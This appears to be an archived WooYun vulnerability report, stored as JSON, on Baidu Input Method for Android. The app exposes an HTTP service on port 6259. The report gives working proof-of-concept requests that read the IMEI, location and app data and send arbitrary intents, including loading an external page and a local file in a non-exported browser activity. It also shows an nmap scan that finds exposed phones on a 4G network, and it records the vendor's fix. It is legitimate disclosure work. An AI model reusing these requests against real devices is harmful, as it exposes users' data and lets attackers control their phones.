{"id": 73353, "wybug_id": "wooyun-2015-0145365", "wybug_title": "百度输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标）", "wybug_corp": "百度", "wybug_author": "瘦蛟舞", "wybug_date": "2015-10-08 16:47", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： 百度输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标） 详细说明：  通过 netstat 发现百度输入一直监听6259端口\nroot@hammerhead:/ # busybox netstat -tunlp                                     Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    tcp        0      0 :::6259                 :::*                    LISTEN      17247/com.baidu.inp\n通过逆向分析app 发现6259提供一个 web 服务\n\n该 web 服务通过截取 url 中字符串取得命令执行实现类\n\n对请求的 referrer 进行了验证.所以在伪造这个请求的时候得加上百度或者 hao123的 referrer\n\n   漏洞证明：  获取应用信息:6259/getpackageinfo?callback=123&packagename=com\n\n获取 imei (倒序)\n\n其中还有一个比较有意思的功能,远程发送 intent\n\n从代码代码来看百度输入通过Intent.parseUri()来解析远程发送的 intent 信息之后再进行查询.匹配到正确的 intent 后执行打开 activity 或者 发送广播的操作intent-based URI基本语法如下：\nintent:   HOST/URI-path // Optional host   #Intent;      package=[string];      action=[string];      category=[string];      component=[string];      scheme=[string];   end;\n因为是在url 中,poc 构造完后需要对其进行 urlencodePOC的构造可以参考 android 源码对此函数的处理https://code.google.com/p/android-source-browsing/source/browse/core/java/android/content/Intent.java?repo=platform--frameworks--base#6514也可以参考 drops 的文章http://drops.wooyun.org/papers/2893通过这个功能能达到哪些攻击效果了- 打开钓鱼页面/广告页面/恶意 apk 页面- 打开浏览器利用 webview 的 UXSS 和代码执行等漏洞进行攻击 (和系统版本有关)- 因为intent 是出自 app 自身所以不考虑跨进程的问题,直接访问一些未导出的组件进行攻击- 恶意消耗用户流量/电量/干扰用户打开输入法内置浏览器192.168.1.102:6259/sendintent?callback=123&intent=intent%3A%23Intent%3Bcomponent%3Dcom.baidu.input%2f.ImeWebBrowseActivity%3BS.url%3Dhttp%3A%2f%2fuxss.sinaapp.com%3BS.name%3Dtest%3Bend%3B此 activity 在配置文件导出设置为 false,但是因为是本进程内发起的 start 可以无视\n<activity android:configChanges=\"0x000004A0\" android:excludeFromRecents=\"true\" android:exported=\"false\" android:hardwareAccelerated=\"false\" android:launchMode=\"1\" android:name=\".ImeWebBrowseActivity\" android:process=\":event\" android:screenOrientation=\"1\" android:taskAffinity=\"com.baidu.input.event\" android:theme=\"@7F0B0000\">\t\t</activity>\n本地域访问权限也是开着的http://192.168.1.102:6259/sendintent?callback=123&intent=intent%3A%23Intent%3Bcomponent%3Dcom.baidu.input%2f.ImeWebBrowseActivity%3BS.url%3Dfile%3A%2f%2f%2fdata%2fdata%2fcom.baidu.input%2fshared_prefs%2ftj.xml%3BS.name%3Dtest%3Bend%3B\n\n打开系统浏览器192.0.0.188:6259/sendintent?callback=123&intent=intent%3Ahttp%3A%2f%2fdrops.wooyun.org%2fwebview.html%23Intent%3Baction%3Dandroid.intent.action.VIEW%3Bend打开照相机192.0.0.188:6259/sendintent?callback=123&intent=intent%3A%23Intent%3Baction%3Dandroid.media.action.STILL_IMAGE_CAMERA%3Bend卸载 appintent:package:org.wooyun.hiwooyun#Intent;action=android.intent.action.DELETE;end新建短信intent:smsto:10000#Intent;action=android.intent.action.SENDTO;end新建联系人intent:#Intent;action=android.intent.action.INSERT_OR_EDIT;S.name=magic;S.phone=+8610000;i.phone_type=2;type=vnd.android.cursor.item/person;end小视频有些大,还是算了.给个 intent 的监控图吧....\n\n扫描自己手机4G 联网下一个 C 段的6259端口情况如下\nnetstat -naProto Recv-Q Send-Q Local Address          Foreign Address        State tcp       0      0 10.137.47.235:35455    61.151.186.121:443     ESTABLISHEDtcp6       0      0 :::6259                :::*                   LISTENtcp6       1      1 ::ffff:10.137.47.235:55925 ::ffff:140.205.162.6:80 LAST_ACKtcp6       1      1 ::ffff:10.137.47.235:54782 ::ffff:42.120.169.3:80 LAST_ACKtcp6       1      1 ::ffff:10.137.47.235:39986 ::ffff:42.120.169.21:80 LAST_ACKtcp6       1      0 ::ffff:10.137.47.235:56484 ::ffff:115.231.102.235:80 CLOSE_WAITtcp6       1      0 ::ffff:10.137.47.235:48534 ::ffff:61.177.126.143:80 CLOSE_WAITtcp6       0      0 ::ffff:10.137.47.235:37898 ::ffff:54.255.252.136:5223 ESTABLISHEDtcp6       1      1 ::ffff:10.137.47.235:38676 ::ffff:42.120.169.21:80 LAST_ACK\n\n./nmap -sT --open -p6259 10.137.47.0/24 -n -PN -vv                             <Starting Nmap 5.51 ( http://nmap.org ) at 2015-09-29 03:56 UTCInitiating Connect Scan at 03:56Scanning 256 hosts [1 port/host]Discovered open port 6259/tcp on 10.137.47.25Discovered open port 6259/tcp on 10.137.47.130Discovered open port 6259/tcp on 10.137.47.247Discovered open port 6259/tcp on 10.137.47.138Discovered open port 6259/tcp on 10.137.47.196Discovered open port 6259/tcp on 10.137.47.101Discovered open port 6259/tcp on 10.137.47.106Discovered open port 6259/tcp on 10.137.47.56Discovered open port 6259/tcp on 10.137.47.212Discovered open port 6259/tcp on 10.137.47.235Discovered open port 6259/tcp on 10.137.47.31\n---其他功能:获取联网方式192.0.0.188:6259/getapn?callback=123获取某字符串192.0.0.188:6259/getlocstring?callback=123获取服务信息192.0.0.188:6259/getserviceinfo?callback=123定位192.0.0.188:6259/geolocation?callback=012&timeout=1&error=0搜索信息192.0.0.188:6259/getsearchboxinfo?callback=123下载信息192.0.0.188:6259/scandownloadfile?callback=123&apkfilelength=1&apkfilename=test.apk&apkpackagename=com.baidu.input&apkexpiredtime=10&scanedexpiredtime=10&scanedonetime=1   修复方案：     版权声明：转载请注明来源 瘦蛟舞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-10-08 18:35 厂商回复： 感谢提交，漏洞分析很详细！赞！ 最新状态： 2015-10-22：百度输入法最新版本中已经修复该漏洞，即将发布。  ", "replys": "漏洞评价：\n评价\n     2015-10-08 16:51 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  好详细的分析，4G网段内可攻击的案例。    \n     2015-10-08 17:13 |    \t\t坏男孩-A_A \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:11        | 膜拜学习中)\t\t \n  @疯狗 大婶*_*  坐等公开学习    \n     2015-10-08 19:24 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:267 漏洞数:20        | 当我又回首一切,这个世界会好吗?)\t\t \n  @疯狗 迫不及待想扫4G网段了    \n     2015-10-08 20:24 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:71        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  我猜是@小荷才露尖尖角    \n     2015-10-08 20:56 |    \t\t小荷才露尖尖角 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:14        | less is more)\t\t \n  我也想知道漏洞详情    \n     2015-10-08 21:20 |    \t\tChora  \t\t\t( 普通白帽子  |\t\t\t        Rank:337 漏洞数:22        | 生存、生活、生命。)\t\t \n  @小荷才露尖尖角 目测没有安卓牛拓展的深。    \n     2015-10-11 22:42 |    \t\tcnrstar \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:23        | Be my personal best!)\t\t \n  @疯狗 每次你们都能提前看到详情，这福利。。    \n     2015-10-12 08:30 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:10        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区枫叶正...)\t\t \n  @cnrstar 可能就是疯狗审核得把。等公开了一定要精读。    \n     2015-10-12 09:41 |    \t\tSpid3r \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:10        | 常年撒网打鱼.)\t\t \n  mark    \n     2015-10-12 10:53 |    \t\t深蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:1057 漏洞数:238        | 喷我的来吧  放马过来  我看着)\t\t \n  看起来好牛X的样子哦    \n     2015-10-12 17:59 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  我觉得有必要爆破下@疯狗 的账户。。。能看到很多干货~~~~别拦我，我准备去买电脑了。。。。    \n     2015-10-13 14:18 |    \t\tsmail小白 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 爱研究 算么)\t\t \n  @鬼魅羊羔 楼上加一    \n     2015-10-13 15:44 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  马克    \n     2015-10-15 14:10 |    \t\ttheone \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:4        | hodor，hodor)\t\t \n  我猜是瘦瘦牛发的    \n     2015-10-15 14:11 |    \t\t坏男孩-A_A \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:11        | 膜拜学习中)\t\t \n  @鬼魅羊羔 楼上加一二    \n     2016-01-12 11:44 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | )(2009年荣获CCAV首届挖洞大使称号)(★★★...)\t\t \n  nb!!!   为什么验证码要刷一次输两次才能成功    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}